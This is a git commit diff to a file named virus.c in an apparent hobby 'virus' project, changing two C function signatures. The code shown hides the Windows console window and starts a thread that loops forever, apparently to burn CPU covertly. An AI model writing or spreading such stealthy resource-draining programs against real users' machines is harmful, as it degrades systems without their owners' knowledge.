0db2d287460ceeceedd3016594569b7d8fc1b0cf
naga272 <114398392+naga272@users.noreply.github.com>
2023-05-04 07:40:18 +0200

    Update virus.c

--- virus/package/virus.c
+++ virus/package/virus.c
@@ -2,7 +2,7 @@
 #include <windows.h> // libreria che uso per nascondere la console
 #include <pthread.h>
 
-void function(){
+void function(void){
 	int a = 1;
 	while(1){
 		++a;
@@ -10,7 +10,7 @@ void function(){
 	pthread_exit(0);
 }
 
-void main(int argc, char *argv[]){
+void main(void){
 	HWND myWindow = GetConsoleWindow();
 	pthread_t multi_thread;		// multi thread
 	ShowWindow(myWindow, SW_HIDE); 	//nascondo la console
